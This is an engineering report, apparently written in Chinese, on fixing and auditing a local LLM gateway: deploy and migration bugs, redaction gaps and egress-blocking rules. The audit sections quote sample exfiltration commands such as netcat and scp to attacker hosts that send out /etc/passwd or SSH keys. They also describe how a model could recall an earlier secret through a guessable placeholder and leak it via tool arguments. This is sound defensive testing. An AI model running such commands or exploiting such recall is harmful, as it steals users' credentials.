### 1.2 部署：踩到一个真缺陷（已修）

`scripts/deploy-local.sh deploy` 第一次**失败**在 PG 数据目录搬迁这一步：

```
[deploy-local] migrating llm-gateway-pg data to /Users/niuer/kaixuan/postgres
[deploy-local] creating new llm-gateway-pg with shared storage at /Users/niuer/kaixuan/postgres
[deploy-local] docker-run: ... Bind for 127.0.0.1:5432 failed: port is already allocated
[deploy-local] error: existing PostgreSQL data migration failed; no application was started
```

**两处根因（都是真缺陷，不是本机环境问题）：**

1. **硬编码宿主端口**：重建容器时写死 `-p "127.0.0.1:5432:5432"`，而原容器发布在
   `127.0.0.1:54318`（本机 `acc-pg17` 占着 5432）。两重后果：
   - 宿主 5432 被占 ⇒ `docker run` 直接失败（本次即如此）；
   - **即使 5432 空闲也是错的**：容器 env 里的 DSN 仍写 `@127.0.0.1:54318`，
     而重建后的容器监听 5432 ⇒ 网关去连一个**没人监听**的端口。
2. **不认识运维刻意选定的数据目录**：本机 PG 数据目录是 `~/kaixuan/postgres-citus`
   （镜像 `kx-citus-pg17:13.3.0-vector-arm64`，带 `citus 13.3-1` + `citus_columnar 13.3-1`
   + `vector 0.8.1`），而 deploy 只看 `KAIXUAN_ROOT` ⇒ 判定「不在 shared 位置」⇒
   试图把它搬回 `~/kaixuan/postgres`（一个**空壳**目录：既没有 citus 扩展，
   又是被别的迁移失败拷贝污染过的）。
   ⇒ **运维刻意选定的目录会被静默换掉**，而且那一跳本身还带着硬编码端口的缺陷。

**修法**（两处 + 契约门）：

- `scripts/deploy-local-lib.sh` 的 `dl_shared_pg_dir()` 现在尊重 `LLM_GATEWAY_PG_DATA_DIR`
  —— 这**不是新造的口径**：本仓 `scripts/local-dev/recreate-llm-gateway-pg.sh:51` 与
  `scripts/local-dev/recover-pg-citus-image.sh:81` 早就把它当作既有契约，
  只有 deploy 这条链没接上。
- 新增 `dl_pg_publish_spec()`：从原容器的 `NetworkSettings.Ports` 读回
  `(HostIp, HostPort)` 并沿用（`LLM_GATEWAY_PG_PORT_BIND` 优先级最高，
  与 `local-dev/recreate-llm-gateway-pg.sh:52` 同契约）⇒ **端口与 DSN 成对沿用**。
- 契约门 `tests/deploy_local_contract_test.sh` 追加 2 组共 8 条断言。

**变异验证**（本仓纪律：判据写完必须确认它会红）：

| 变异 | 预期变红的判据 | 实测 |
|---|---|---|
| 把 `-p "$pg_publish_spec"` 改回 `-p "127.0.0.1:5432:5432"` | `deploy-local.sh must not hardcode the PG publish spec to 127.0.0.1:5432` | ✅ 红 |
| 去掉 `LLM_GATEWAY_PG_DATA_DIR` 覆盖 | `LLM_GATEWAY_PG_DATA_DIR must win over KAIXUAN_ROOT` | ✅ 红 |
| 还原 | — | 29 条全绿 |

**修完的部署结果**：`VERIFY_PASS=1`，`VERIFY_RELEASE=2.5.8.2760`，`VERIFY_PORT=8782`，
凭据解密冒烟 `providers=2452,2453,2454 creds=3 failed=0`。
PG 容器未被动过（仍是 `llm-gateway-pg` / `postgres-citus` / `127.0.0.1:54318`）——
**「不搬迁」正是修对了的证据**。

### 1.5 部署再次被真缺陷挡住：boot ensure 链**索引了它自己不补的列**（已修）

第二轮重新部署时，`deploy-local.sh` 在**数据库迁移**这一步中止：

```
2026/10/20 21:29:32 INFO postgres connected max_conns=16 min_conns=2
2026/10/20 21:29:37 WARN schema migrations failed transiently, retrying attempt=2 max=2
            error="ERROR: column \"provider_id\" does not exist (SQLSTATE 42703)"
[deploy-local] error: database migration failed; structured report follows
    {"status":"error","message":"db open: ERROR: column \"provider_id\" does not exist (SQLSTATE 42703)"}
```

**根因（结构性，不是本机环境问题）**：

`db/db.go` 的 `ensureRequestLogSchema` 在 `_request_logs` 上建两个带 `provider_id` 的索引
（`idx_request_logs_provider_quality`、`idx_request_logs_provider_tool_calls`），
但**从不补 `provider_id` 这一列**。这两个索引是 2026-06-19（`9cd51d8a7`
「per-provider tool_call quality fix mode」）引入的，当时目标表是 v1 的 `request_logs`；
v2 改名（迁移 `860`：`request_logs` → `_request_logs`）把它们**一起搬到了新表名**上，
而改名后的表在最小/新装基线形态下**没有**这一列。

⇒ **任何 `_request_logs` 不带 `provider_id` 的库上，整条 boot 迁移在第一个索引处报
42703 ⇒ 迁移中止 ⇒ 网关起不来。**
⇒ 已是 v1→v2 改名产物的库（211/252 等）本来就有这一列 ⇒ 那边**看不见**这个洞。
⇒ 本机库是**最小基线形态**（`_request_logs` 只有 `id / tenant_id / ts / work_type`
四列，无 v1 `request_logs` 表），所以正好踩中。

**修法**（两处，一起改——`db.go` 自己的注释就要求「新增列/索引时两处一起改」）：

1. ensure 体的 `ALTER TABLE _request_logs` 补 `ADD COLUMN IF NOT EXISTS provider_id BIGINT`
   （与该块「自己索引的列一律自己先补」的既有写法一致；可空、无默认值 ⇒ 零数据影响；
   已有该列的库上是 no-op）。
2. **目录短路清单**（`catalogShortCircuitSQL` 的期望列数组）同步加上 `'provider_id'`。
   ⚠ 这一处漏掉会造成更隐蔽的后果：缺列的库被判成「齐备」⇒ **零 DDL** ⇒ 列永远补不上。

**判据**：`db/r1039_request_logs_provider_id_column_test.go`
（真库行为验证 + 源码顺序判据，变异 M1/M2 全红，见 §9.1）。
真库判据跑在**一次性库** `itgate_r1039` 上（退出即 DROP，不碰 `llm_gateway`）。

⇒ **这条同时命中用户诉求里的「新装路径必须绿」**：新装/最小基线库此前**起不来**。

### 1.6 修完 provider_id 后，露出下一个同族洞：**族表退役 ≠ 族表还在**

修掉 `provider_id` 之后，同一条 boot 迁移链继续往下走，撞上第二个洞：

```
ERROR: relation "_request_logs_hot" does not exist (SQLSTATE 42P01)
```

**根因仍是「体与清单口径不一致」**：

- 目录短路清单（`catalogShortCircuitSQL`）判断「列缺不缺」时用的是
  `WHERE to_regclass('public._request_logs_hot') IS NOT NULL` ⇒
  **它早就承认「这张表可以不在」**（request_logs 族退役后确实不在）；
- 而 ensure **体**却**无条件** `ALTER TABLE _request_logs_hot …` ⇒ 表不在就 42P01。

⇒ 修法：新增 `db.tableExists()`（`to_regclass` 口径，与清单**同一把尺子**），
ensure 体按表的存在性分别执行 hot 侧与母表侧的 DDL；母表整个不在时整族跳过。

**再往下一个洞**（同一族）：

```
ERROR: relation "providers" does not exist (SQLSTATE 42P01)
```

⇒ 这已经不是 ensure 链的「族表」问题，而是**本机库本身缺核心表**：

| 对象 | 本机库实测 | 说明 |
|---|---|---|
| `providers` | **不存在**（只有 `provider_catalog`，那是**静态目录**：`code / tier / base_url_template / …`，不是租户的 provider 实例） | 代码多处 `FROM providers` ⇒ `/api/providers` 实测 **500** |
| `credentials` | **不存在** | — |
| `request_logs` / `_request_logs_hot` | **不存在** | 族已退役（request_logs → session_turns） |
| `session_turns` / `session_turns_hot` | 存在 | 新族 |
| `users` / `api_keys` / `agents` / `_request_logs` | 存在 | — |

⇒ **本机库是个「半迁移」产物**：台账 `gateway_db_revision_sequences` 记着
`860_rename_request_logs_family…` 已于 2026-10-16 应用，而被它改名的
`request_logs` / `request_logs_hot` **压根不存在** ⇒ **台账与现实不一致**（§8 第 6 条）。

⇒ 而 `scripts/deploy-local.sh` 的 `apply_schema_if_empty` 判「库是否已装 schema」的探针是
`('users','_request_logs','credentials','api_keys','agents')` 里**任一存在就跳过快照**
⇒ 本机库命中「任一存在」（4/5）⇒ **快照从未被应用** ⇒ 核心表一直缺。

**处置**：按 deploy 脚本的**设计新装路径**重建本地库 —— 先 `pg_dump` 备份
（`/tmp/kx-pg-backup/llm_gateway_backup.dump`，16 MB），再 drop + create 空库，
让 `apply_schema_if_empty` 走「库是空的 ⇒ 应用 `sql/schema/{00-prereqs,01-schema,02-seed}.sql`」
这条**本来就被设计好的**分支，然后由启动迁移序列 + ensure 链补齐其余部分。

⚠ 这一步**丢掉了本机库的既有数据**（usage_ledger / request_logs 等本地测试数据）。
用户诉求是「更新本地的 pg17 数据库，确保本地的网关与数据库为最新版本」⇒
重建到「与仓内同版本且自洽」正是该诉求要的结果；备份已留，可回滚。

### 2.3 漏检问题

| 问题 | 证据 | 状态 |
|---|---|---|
| `configs/sensitive_patterns.yaml` 的 **`medical:` 整族永不装载** | `detector_config.go:12-16` 的 `patternConfig` 只有 `PII/Secret/Financial` 三个字段；`grep -rn medical --include=*.go security/` 零命中 | 本轮修：`patternConfig` 加 `Medical` 字段 + 装载器加这一族，并补**通用**门 `TestR1039EveryYAMLRuleIsLoaded`（**双向**：YAML 每条 pattern 都要装载，且装载的每条都要在 YAML 里） |

**取舍**：空格分隔形态下 **< 8 字符**的短凭据（`abc123`）**不**再命中；
`password "hunter2 secret"`（带空白的引号值）在纯空格形态下**不**命中
（`password is 'two words#'` 那种结构化形态仍命中，r1034 已覆盖）。

**非规则段的处置**（YAML 里还有几段不是规则源，全部写进了 YAML 注释里）：

| 段 | 处置 | 理由 |
|---|---|---|
| `medical:` | **装载** | 它是规则族（有 `enabled` + `patterns:`），运维合理地以为它是活的 |
| `global:`（`min_confidence` / `enable_cache` / `cache_ttl`） | 标注**不是规则源** | 检测器没有置信度/缓存概念；**忠实实现 `min_confidence: 0.7` 会把 `medical.medication`（0.65）删掉** ⇒ 「更完整」的实现反而**减少**覆盖 ⇒ 不实现，只把语义写清楚 |

| `custom_rules:` | 标注 + **守卫** | 它的 schema 不是装载器认识的 ⇒ 断言 `rules` 保持为空并指向「写进某个 `patterns:` 族」 |

allow-list 本身也被守卫（登记的段在 YAML 里消失 ⇒ 红；登记的段长出 `patterns:` ⇒ 红）。

| 缺陷 | 症状 | 状态 |
|---|---|---|
| **D2** 全角/裸形组合漏网 | `ＳＥＮＳＩＴＩＶＥ：ｓｅｃｒｅｔ：１`（**无花括号**）**整条原样到客户端** —— 既不被复原、也不被残余探针发现。根因：span 探测跑在原文上且只认 ASCII，而 `parseLoosePlaceholder` 侧**本来**就做宽度折叠（`placeholder_loose.go:206`）⇒ **解析面早就宽度就绪，探测面没有** | 本轮修 |
| **D3** 退化标记留残渣 | `{SENSITIVE:secret:1a}` → `{[REDACTED:secret]1a}`；`{SENSITIVE:sec` → `{[REDACTED:sec]`（类型名是垃圾） | 本轮修 |

**明确未修 + 需 owner 裁决的（D1）**：占位符是**零熵**的（`{SENSITIVE:<type>:<index>}`，
index 是会话级自增计数器），且映射表是**整会话**累积的 ⇒ 模型只要写出
`{SENSITIVE:secret:1}` 就能取回**上一轮**铸造、本轮根本没发给它的秘密，并可塞进
tool 参数出网。现有判据**全是**「映射里不存在的 index」⇒ 走的是「解析不出 ⇒ 遮蔽」分支，
**「索引存在但本轮没发出去」这一支没有任何判据**。

⚠ 但**不能**按「只认本轮发过的 token」来修：多轮工具调用里，模型在第 3 轮引用第 1 轮的
凭据标记是**合法且必要**的用法（用户第 1 轮给了 API key，模型第 3 轮拿它调工具）。
按轮绑定会把正常流程打断。真正的收敛点在**外发面**（还原出来的值是否被 egress 守卫看见），
不是复原面 —— 见 §3 的 D4。

## 3. 数据外泄阻断审计（范围收窄 + 客户端提示）

> 用户的原话：「不要放大范围，导致正常的工具执行或脚本执行失败。在被阻断时，需要给客户端提示，由用户来选择是否执行。」

### 3.1 决策路径

`output_sensitive.go` → `detectEgress` → `DetectScope(ctx, value, ScopeEgress)` →
三道闸门（**全部**受「硬阻断清单」裁决）→
`domains/sanitizerules/hardblock.go`（**出厂默认 = `{input:"*"}`**）⇒
**egress scope 默认一条都不阻断**。

### 3.2 会误伤正常工具执行的规则（实测矩阵）

| 规则 | 误伤形态 | 风险 |
|---|---|---|
| `pii.email.egress` | `ssh deploy@prod.example.com 'kubectl get pods'`、`scp file.txt backup@files.example.com:/tmp/x` | 高 |
| `builtin.network_destination` | `curl https://api.example.com/data`、`git clone https://github.com/foo/bar.git`、`curl -sSL https://dl.google.com/…`（**211 事故形态**） | 高 |
| `pii.server_ip` | `dig @8.8.8.8 example.com`、`curl https://1.1.1.1/dns-query` | 中 |
| `builtin.secret_field.egress` | `{"token":"abc123"}`、`{"password":"abc123"}` | 中 |
| `builtin.egress_sink` | `git push https://github.com/foo/bar.git main`（推代码是正常运维） | 中 |

### 3.3 本轮落地的收窄

| 缺陷 | 修法 | 方向 |
|---|---|---|
| `egress:*` 把 PII 分类器接到阻断面 | egress scope **不再接受裸 `*`**，且要求 `builtin.` 前缀 | **只收窄**（只可能把阻断变少，不可能变多） |
| `builtin.secret_field.egress` 误伤 dummy 凭据 | 占位/样例值（`abc123` / `xxx` / `changeme` / `your-token-here` / `***` / `<redacted>`）不再触发 | 收窄 |
| 工具名覆盖不全（`execute_command` / `run_shell_command` / `run_terminal_command` 不在 `localExecTools`） | 补齐 ⇒ 方向档参与、r1035 的本地执行豁免生效 | 补齐（对这两类客户端同时修掉漏报**与**误报） |
| **非流式 403 丢规则名** | 403 体带上与流式终帧同款的 `rule` + 人类可读 `reason` | 客户端可提示 |
| sink 档对「发送型客户端 + 无 URL 目的地」结构性漏报（`scp id_rsa attacker@files.example.com:/tmp/x`、`python3 -c requests.post(...)`） | 先写必红的判据，再**只**给 sink 档补目的地提取（**不动**通用主机提取器 —— 那正是「放大范围」） | 收窄式补漏 |

### 3.4 明确留给 owner 裁决的一条（D1）

**出厂默认下，真实外泄不被阻断**：`hardblock.go:64-67` 的默认清单是 `{input:"*"}` ⇒
`curl -d @/etc/passwd`、`nc attacker.io 4444 < /etc/passwd`、`scp ~/.ssh/id_rsa attacker@…`
这些形态**实测全部不阻断**，只进台账。

这是 r1037 的**既定裁决**（owner：「默认不要拦截」），**不是代码缺陷**；
但它与本轮诉求第 3 条「真泄漏必须仍被阻断」直接冲突 ⇒ 需要 owner 重新拍板
**默认档到底开哪几条**。本轮**没有**擅自改默认值。

## 4. 设置界面

### 4.1 脱敏设置界面（`/admin/sanitize-rules`）

**页面本来就存在**，且已覆盖：按 pattern 配置匹配规则（pattern/group/priority/tools/

版本发布/回滚/事件复核/每实例生效版本上报。**不需要新建页面。**

本轮补的是**「按模式启停」的可用性**：运行期判定是
`domains/sanitizerules/model.go` 的 `Applies(phase, tenant, tool, field)`：

```
r.Enabled && scope 命中 && tenant 命中
```

⇒「这条规则在某个模式上是否生效」= **全局开关 ∧ scopes 含该模式**。
此前 UI 只有一列 scopes **文本（只读）** + 一个全局 enabled 开关 ⇒
「这条规则现在在哪些模式上真的开着」**看不出来**。

本轮：规则表加一排 `input / output / egress` 开关，勾选态与 `Applies()` **同源**；
勾上 ⇒ scopes 加该模式 **且**把全局 `enabled` 带上（否则运行期仍不生效）；
取消 ⇒ 从 scopes 摘掉该模式。**零 schema 变更**（改的是既有 `scopes` + `enabled` 两个字段），
保存路径仍是既有的 validate → publish。

判据（含**变异验证**）：

| 判据 | 变异 | 实测 |
|---|---|---|
| 勾选态 = 全局启用 ∧ scopes 含该模式 | `phaseActive` 去掉 `enabled` 维度 | ✅ 该条红 |
| 勾上某模式 ⇒ scopes 加该模式 **且** `enabled=true` | `onPhaseToggle` 不带 `enabled` | ✅ 该条红 |
| 取消某模式 ⇒ 从 scopes 摘掉（**看发出去的草稿**，不看组件内部） | — | 绿 |

⚠ 判据纪律：`<script setup>` 的内部变量**不挂在 `vm` 上**，写 `w.vm.draft` 只会拿到
`undefined`，再套个 `if (draftScopes)` 就成了**恒不执行**的假绿 ⇒ 改用
「validate 发出去的草稿」这个**可观测契约**做断言。

### 4.2 提示词注入规则详情（`/admin/prompt-injection?tab=rules`）

**此前完全没有详情入口**：rules tab 里没有任何查看/编辑的入口，唯一的行内写操作是

- `GET /api/admin/prompt-injection/rules/{id}`（**新增**；此前该路径返 **405**）

#### 4.2.1 顺带修掉一个**正在损坏数据**的缺陷

`updateRule` 过去把 body 解码成**值类型**结构体后**无条件 SET 8 列** ⇒

### 7.3 浏览器验收里**顺手查出来的真问题**

1. **枚举列空串 ⇒ 500（已修）**：`category_new` / `action_override` 是可空枚举，
   前端「没选」给的是**空串** ⇒ `SQLSTATE 22P02` ⇒ **从 UI 新建自定义规则必失败**。
   修法见 §9；真库判据 + 变异验证（还原即红）。

2. ⚠ **一处「疑似缺陷」经实测证伪（订正本轮早先的判断）**：读代码时看到
   `validate()` 里只有 `if (result.valid)` 分支会设 `notice`、而 `else` 什么也不做，
   于是**推断**「后端判非法时前端不给任何提示」。**实测推翻了它**：
   给语义声明类规则（`pii.account`，`kind=account_declaration`）加 `output` 档后点验证，
   页面**确实**显示错误横幅
   `invalid sanitize rule configuration: rules[0].scopes semantic declarations are input-only`，
   且发布按钮**保持禁用**。

   根因是我的读法漏了一环：**后端没有「200 + valid:false」这条路径**
   （`admin/sanitize_rules_handler.go` 的 `/validate` 分支只有两种结局：
   `sanitizerules.Compile` 失败 ⇒ 4xx，或成功 ⇒ 200 + `valid:true`），
   ⇒ 前端走的是 `catch` 分支，错误一定会被显示。

   ⇒ **教训**：「读代码看出一个缺陷」不等于「缺陷存在」。本轮已把它从 §8 的遗留清单里
   删除，并在这里留下「曾误判」的记录，避免下一个人按错误线索去改代码。

### 7.4 性能复测（>2s 的那一项）

第一次扫描读数不可信（机器上有**其它并发会话**，load average 长期 150~250，
上一轮记下的「/sessions 12.6s」就是争用造成的假象）。等负载回落到 **13.4** 后重测，
方法改为**每端点 3 次取 min**，并在扫描前后各测一次**对照端点** `/readyz` 量化环境底噪。

| 指标 | 结果 |
|---|---|
| 扫描范围 | 259 条 `/api/admin/*` 路由（管理员会话，逐条 GET） |
| 状态分布 | 163×2xx / 94×4xx（GET 扫 POST 端点与缺参路径的预期结果）/ 2×503（§7.2 的两个「未配置」端点） |

| **非流式最慢** | `/api/admin/credential-success-rates` **548ms**、`/api/admin/sessions` 397ms、`/api/admin/settings` 219ms —— **无一超过 2s** |
| 环境底噪对照 | `/readyz` min 约 3ms（扫描前后各一次） |

⇒ **本机没有任何需要优化的 >2s 端点**；上一轮的慢读数全部是并发负载造成的假象。
按用户口径「超过 2 秒需要检查慢的原因并优化 SQL/表结构」——
**本轮没有需要优化的对象**，不为「有优化动作」而硬造。

#### 缺陷 A：Echo 侧 admin 端点**不认 cookie** ⇒ 浏览器 cookie 会话被 401

**根因（两套中间件对「凭据从哪来」的认知不一致）**：

| | 取凭据方式 | 校验 | 覆盖范围 |
|---|---|---|---|
| ServeMux 侧 | `admin/auth.go` 的 `extractBearerOrCookieToken`：**头或 cookie 都认** | `identity.Verify` + issuer/audience | `admin` 组全部端点 |
| **Echo 侧** | `cmd/gateway/main_jwt_middleware.go`：**只认 `Authorization: Bearer`** | 同一个校验器 | `cmd/gateway/main.go:7174` 的 `adminGroup := e.Group("/api/admin", requireSuperAdmin)` |

而前端 `web/src/api/_core.ts` 的 `headers()` 在 **JWT 登录态下刻意不发** Authorization 头
（`const bearer = isAuthenticated() && store.userInfo ? '' : authBearer()` ——
注释写明「让 HttpOnly cookie 承载鉴权，避免内存里的 JWT 盖住别的标签页更新的 cookie」）。

⇒ **浏览器 cookie 会话访问 Echo 注册的 admin 端点 ⇒ 401**。本机实测受影响的 8 个：
`/api/admin/tiers`、`/api/admin/licenses`、`/api/admin/vibecoding/projects`、
`/api/admin/faults`、`/api/admin/releases`、`/api/admin/autoupdate`、
`/api/admin/center/*`、`/api/admin/routing-opt/ml`。

**修法**：Echo 中间件改用 `admin.ExtractBearerOrCookieToken(c.Request())`
（该函数已导出；cookie 里就是 `SignToken` 签的同一串 JWT，**校验器/issuer/audience
一律不变**，只改**传输方式**，不扩大凭据类型）。
⇒ cookie 是 HttpOnly + SameSite=Strict，不构成 CSRF 面。

**判据**：`cmd/gateway/r1039_jwt_middleware_cookie_test.go`（5 组用例）。
**变异验证**：M1（改回只认 Bearer 头）→ 红；M2（不注入身份）→ 红；还原 → 绿。

**遗留**（本轮**不**扩大）：ServeMux 侧那个「**改密码后撤销会话**」的探测，
Echo 侧**没有**对应实现 ⇒ 改密码后，Echo 侧用旧 cookie 的会话**不会**立刻失效。
这是**既有差异**（不是本轮引入），本轮只补了「cookie 能过认证」这一半。

#### 缺陷 B：`/admin/usage-enhanced` 整页白屏（前端照一份**从未存在**的契约写）

**症状**：页面 body 只有 **103 字符**，控制台 TypeError。

**根因**：`web/src/api/usageEnhanced.ts`（批 158b，2026-10-17）在 5 个端点上
**另写了一套类型与 URL**，与后端真实契约全部不符：

| 端点 | 前端当初写的 | 后端真实 | 后果 |
|---|---|---|---|
| `period-compare` | `current=last_7d&previous=previous_7d` | 只收 `YYYY-MM`（`admin/usage_enhanced.go:parsePeriod` 用 `time.Parse("2006-01", …)`） | **恒 400** |
| hot-keys | `/api/admin/usage/hot-api-keys` | `/api/usage/hot-keys` | **恒 404** |
| summary | `total_cost` / `days` | `total_cost_usd`；**没有** `days` | 渲染成「—」 |
| cost-trend | `data[]` / `{date,cost,requests}` | `entries[]` / `{dimension_value,request_count,total_cost_usd,…}` | `data.length` → **TypeError** |
| period-compare | `delta_cost` / `delta_cost_pct` | `change_abs` / `change_pct`（**已是百分数**） | 渲染成「—」；且乘 100 会显示成 2340.0% |
| cache-economics | `cache_hit_rate` | `cache_hit_ratio`（0~1 比例） | 渲染成「—」 |
| hot-keys 条目 | `key_id` / `key_name` | `api_key_id` / `key_prefix` / `application_code` | 渲染成「—」 |

⇒ **更糟的是它自带的单测用同一套错形状做夹具** ⇒ 测试恒绿、线上恒炸。
⇒ 这是「**用前端自己声明的错形状做 fixture ⇒ 假绿**」的教科书形态。

**修法**（不是去改后端契约——后端形状被其它调用方共用，是正典）：

1. `web/src/api/usageEnhanced.ts` **删除平行类型**，改为**复用 `web/src/api/usage.ts` 里
   已有且正确的类型与函数**（`getUsageSummary` / `getHotApiKeys` / `getCostTrend` /
   `getPeriodCompare` / `getCacheEconomics`）⇒ 后端契约在前端只有**一处**定义。
2. `web/src/views/admin/UsageEnhancedView.vue` 改读**真字段**；顺带补上**降级横幅**
   （后端在 schema 落后时返回 200 + 全 0，「本月没花钱」与「本月算不出来」
   在页面上必须是两张脸）；硬编码中文全部走 i18n（`dataLifecycle.usageEnhanced.*`，
   8 语种同步）。
3. 夹具换成**真端点的原始响应**（`web/src/fixtures/usage/`，采集命令写在文件里）。

**判据**（两层，都在真链路上）：
- `web/src/api/usageEnhanced.test.ts`（新写）：只 mock 传输层 `_core.req`，
  按**真实路径**派发真响应（未知路径直接抛错）⇒ 断言请求打到了**哪 5 个 URL**、
  `period-compare` 的参数**必须匹配 `^\d{4}-\d{2}$`**、返回字段**逐字来自真响应**。

**变异验证 M1~M10 全红**（见 §9.2）。
⚠ 其中 **M7 首轮是绿的** —— 暴露了判据自身有洞：
